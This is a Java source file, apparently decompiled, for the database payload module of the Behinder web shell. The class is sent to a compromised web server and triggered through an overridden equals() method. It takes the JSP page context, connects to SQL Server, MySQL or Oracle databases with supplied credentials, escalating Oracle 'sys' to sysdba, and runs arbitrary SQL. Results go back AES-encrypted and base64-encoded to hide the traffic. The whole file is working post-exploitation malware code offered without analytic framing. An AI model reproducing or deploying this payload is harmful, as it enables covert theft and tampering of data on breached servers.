package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Database {
   public static String type;
   public static String host;
   public static String port;
   public static String user;
   public static String pass;
   public static String database;
   public static String sql;
   private Object Request;
   private Object Response;
   private Object Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var13 = false;

      Object so;
      Method write;
      label87: {
         try {
            var13 = true;
            this.fillContext(obj);
            this.executeSQL();
            result.put("msg", this.executeSQL());
            result.put("status", "success");
            var13 = false;
            break label87;
         } catch (Exception var17) {
            result.put("status", "fail");
            if (var17 instanceof ClassNotFoundException) {
               result.put("msg", "NoDriver");
               var13 = false;
            } else {
               var17.printStackTrace();
               result.put("msg", var17.getMessage());
               var13 = false;
            }
         } finally {
            if (var13) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var14) {
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var15) {
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var16) {
      }

      return true;
   }

   public String executeSQL() throws Exception {
      String result = "[";
      String driver = null;
      String url = null;
      if (type.equals("sqlserver")) {
         driver = "com.microsoft.sqlserver.jdbc.SQLServerDriver";
         url = "jdbc:sqlserver://%s:%s;DatabaseName=%s";
      } else if (type.equals("mysql")) {
         driver = "com.mysql.jdbc.Driver";
         url = "jdbc:mysql://%s:%s/%s";
      } else if (type.equals("oracle")) {
         driver = "oracle.jdbc.driver.OracleDriver";
         url = "jdbc:oracle:thin:@%s:%s:%s";
         if (user.equals("sys")) {
            user = user + " as sysdba";
         }
      }

      url = String.format(url, host, port, database);
      Class.forName(driver);
      Connection con = DriverManager.getConnection(url, user, pass);
      Statement statement = con.createStatement();
      if (!sql.startsWith("update") && !sql.startsWith("insert")) {
         ResultSet rs = statement.executeQuery(sql);
         ResultSetMetaData metaData = rs.getMetaData();
         int count = metaData.getColumnCount();
         String[] colNames = new String[count];

         for(int i = 0; i < count; ++i) {
            colNames[i] = metaData.getColumnLabel(i + 1);
         }

         result = result + "[";
         String[] var17 = colNames;
         int var11 = colNames.length;

         for(int var12 = 0; var12 < var11; ++var12) {
            String col = var17[var12];
            String colRecord = String.format("{\"name\":\"%s\"}", col);
            result = result + colRecord + ",";
         }

         result = result.substring(0, result.length() - 1);
         result = result + "],";
         Map<String, Object> record = new LinkedHashMap();

         for(List<Map<String, Object>> recordList = new ArrayList(); rs.next(); result = result + "],") {
            result = result + "[";
            String[] var20 = colNames;
            int var21 = colNames.length;

            for(int var22 = 0; var22 < var21; ++var22) {
               String col = var20[var22];
               record.put(col, rs.getObject(col));
               result = result + "\"" + rs.getObject(col) + "\",";
            }

            recordList.add(record);
            result = result.substring(0, result.length() - 1);
         }

         result = result.substring(0, result.length() - 1);
         result = result + "]";
         rs.close();
      } else {
         int rows = statement.executeUpdate(sql);
         result = result + "[{\"name\":\"RowsEffected\"}],[\"" + rows + "\"]]";
      }

      con.close();
      return result;
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      bos.write(encrypted);
      return this.base64encode(bos.toByteArray()).getBytes();
   }

   private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map<String, Object> objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private String base64encode(byte[] data) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");

      Class Base64;
      try {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
      } catch (Throwable var7) {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Object Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }
}
